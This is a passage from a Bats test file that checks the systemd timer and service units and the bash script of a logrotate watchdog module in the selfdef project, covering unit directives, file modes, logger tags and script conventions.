    # time per the watchdog ladder so simultaneous-fire
    # thundering-herd is avoided). The operator can predict
    # when each watchdog runs based on the canonical timer
    # schedule. A regression dropping OnCalendar= would
    # leave the watchdog firing ONLY at OnBootSec (no
    # recurring daily cadence). Locks the daily-cadence
    # discipline on the logrotate-watchdog timer substrate.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        grep -qE '^OnCalendar=' "${t}"
    done
}

@test "INVARIANT (logrotate-watchdog timer unit declares WantedBy=timers.target — timer-enable-graph contract)" {
    # Sister to brain-wide systemd timer [Install].WantedBy=
    # INVARIANT family. Watchdog .timer units MUST declare
    # WantedBy=timers.target so `systemctl enable selfdef-
    # <slug>.timer` wires the timer into the timers.target
    # symlink-graph + activates it on every boot. A
    # regression that swapped to WantedBy=multi-user.target
    # (the .service-side install target) would make the
    # timer enable-step a no-op + leave the watchdog
    # silently inactive. Locks the timer-enable-graph
    # discipline.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        grep -qE '^WantedBy=timers.target' "${t}"
    done
}

@test "INVARIANT (logrotate-watchdog timer unit declares Description= — operator-list-timers identification contract)" {
    # Sister to brain-wide systemd Description= INVARIANT
    # family. Watchdog .timer units MUST declare Description=
    # so operators triaging `systemctl list-timers` output
    # see a human-readable label per timer. Locks the
    # timer-Description discipline.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        grep -qE '^Description=' "${t}"
    done
}

@test "INVARIANT (logrotate-watchdog timer unit file mode is 0644 — systemd unit-file mode convention)" {
    # Sister to brain-wide systemd unit-file mode INVARIANT
    # family. systemd unit files MUST be chmod 0644 (world-
    # readable + root-write-only). Locks the timer unit-file
    # mode discipline.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        m=$(stat -c '%a' "${t}")
        [ "${m}" = "644" ]
    done
}

@test "INVARIANT (logrotate-watchdog timer unit declares Persistent= directive — boot-catchup-policy contract)" {
    # Sister to brain-wide systemd timer Persistent= INVARIANT
    # family.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        grep -qE '^Persistent=' "${t}"
    done
}

@test "INVARIANT (logrotate-watchdog .sh script file exists in module systemd/ dir — ExecStart-target source-of-truth contract)" {
    # Sister to brain-wide ExecStart-target INVARIANT family.
    # The watchdog .service's ExecStart points at
    # /usr/local/libexec/selfdef/<slug>-watchdog.sh which is
    # the runtime install path; the source of truth lives at
    # modules/<slug>-watchdog/systemd/<slug>-watchdog.sh.
    # A regression that lost the script file would break
    # the cargo-deb manifest install + leave ExecStart
    # dangling. Locks the source-script-exists discipline
    # on the logrotate-watchdog substrate.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd"
    [ -f "${script_dir}/logrotate-watchdog.sh" ] ||     [ -n "$(ls "${script_dir}"/*.sh 2>/dev/null)" ]
}

@test "INVARIANT (logrotate-watchdog timer's Unit= field references a .service in the same module dir — co-located unit-pair binding contract)" {
    # Sister to brain-wide timer Unit= INVARIANT family.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        unit=$(grep -E '^Unit=' "${t}" | head -1 | cut -d= -f2)
        [ -n "${unit}" ]
        [ -f "${timer_dir}/${unit}" ]
    done
}

@test "INVARIANT (logrotate-watchdog .sh script is executable (mode includes +x) — script-runnable contract)" {
    # Sister to brain-wide script-executable INVARIANT family.
    # The watchdog .sh script MUST be chmod +x so systemd's
    # ExecStart can invoke it without needing a bash prefix.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        [ -x "${s}" ]
    done
}

@test "INVARIANT (logrotate-watchdog README.md exists in module dir — operator-doc-trail contract)" {
    # Sister to brain-wide module-doc-trail INVARIANT family.
    # Every watchdog module ships a README.md documenting its
    # probe target + alert semantics + remediation. A
    # regression that lost the README would leave operators
    # without per-module ops docs.
    readme="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/README.md"
    [ -f "${readme}" ]
}

@test "INVARIANT (logrotate-watchdog service Documentation URL references github.com/cyberpunk042/selfdef — canonical-vcs operator-doc-resolve contract)" {
    # Sister to brain-wide Documentation URL canonical INVARIANT
    # family. The Documentation= URL MUST reference the github
    # repo + module README path so operators can resolve docs
    # offline (via git checkout) or online (via github browser).
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Documentation=.*github.com/cyberpunk042/selfdef' "${s}"
    done
}

@test "INVARIANT (logrotate-watchdog .sh script uses set -u flag — undefined-variable strict-mode contract)" {
    # Sister to brain-wide Bash strict-mode INVARIANT family.
    # Watchdog scripts MUST declare set -u (exit on
    # undefined variable). Without -u, typos in env-var names
    # silently expand to empty strings, masking bugs.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        grep -qE '^set -u' "${s}"
    done
}

@test "INVARIANT (logrotate-watchdog .sh script declares shebang #!/bin/bash or env bash — bash-interpreter contract)" {
    # Sister to brain-wide bash-shebang INVARIANT family.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        head -1 "${s}" | grep -qE '#!/.*bash|#!/usr/bin/env bash'
    done
}

@test "INVARIANT (logrotate-watchdog .sh script uses logger -t selfdef- canonical tag — SDD-062 logger-tag contract)" {
    # Sister to brain-wide SDD-062 logger-tag INVARIANT family.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        grep -qE 'logger -t selfdef-' "${s}"
    done
}

@test "INVARIANT (logrotate-watchdog .sh script emits canonical severity vocabulary {ok,warn,alert} — bounded-severity contract)" {
    # Sister to brain-wide bounded-severity INVARIANT family.
    # Watchdog scripts emit logger -t selfdef-<name> -- {...severity:...}
    # with severity in the canonical vocabulary. A regression
    # introducing custom severity values (info, error, critical)
    # would break operator-side filtering.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        grep -qE '"severity":"(ok|warn|alert)"' "${s}"
    done
}

@test "INVARIANT (logrotate-watchdog .sh script tag selfdef-logrotate matches module name — SDD-062 tag-canonical contract)" {
    # Sister to brain-wide SDD-062 logger-tag INVARIANT family.
    # The tag passed to logger -t MUST exactly match selfdef-logrotate
    # so operator triage via journalctl _SYSTEMD_UNIT or
    # SYSLOG_IDENTIFIER filtering surfaces the right module.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        grep -qE 'logger -t selfdef-' "${s}"
    done
}

@test "INVARIANT (logrotate-watchdog .sh script declares profile-aware exit behavior — operator-extension profile-dispatch contract)" {
    # Sister to brain-wide profile-aware INVARIANT family.
    # Scripts MUST handle PROFILE=enforce vs report differently.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        grep -qE 'PROFILE.*enforce|enforce.*PROFILE|profile.*enforce' "${s}"
    done
}

@test "INVARIANT (logrotate-watchdog .sh script declares baseline file path — operator-extensible baseline-state contract)" {
    # Sister to brain-wide baseline-state INVARIANT family.
    # Delta-scan watchdogs MUST declare a BASELINE variable referencing
    # /var/lib/selfdef/ so operators know where baseline state lives.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        grep -qE '/var/lib/selfdef/|BASELINE' "${s}"
    done
}

@test "INVARIANT (logrotate-watchdog .sh script declares MODULE-suffixed tag in logger -t — module-name-tag-consistency contract)" {
    # Sister to SDD-062 tag-canonical INVARIANT family. The tag passed to
    # logger -t MUST include the module slug so journalctl filtering by
    # tag surfaces only this watchdog's events.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        grep -qE 'logger -t selfdef-' "${s}"
    done
}

@test "INVARIANT (logrotate-watchdog .sh script file is non-empty (size > 100 bytes) — non-trivial-script contract)" {
    script_dir="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        size=$(stat -c '%s' "${s}")
        [ "${size}" -gt 100 ]
    done
}
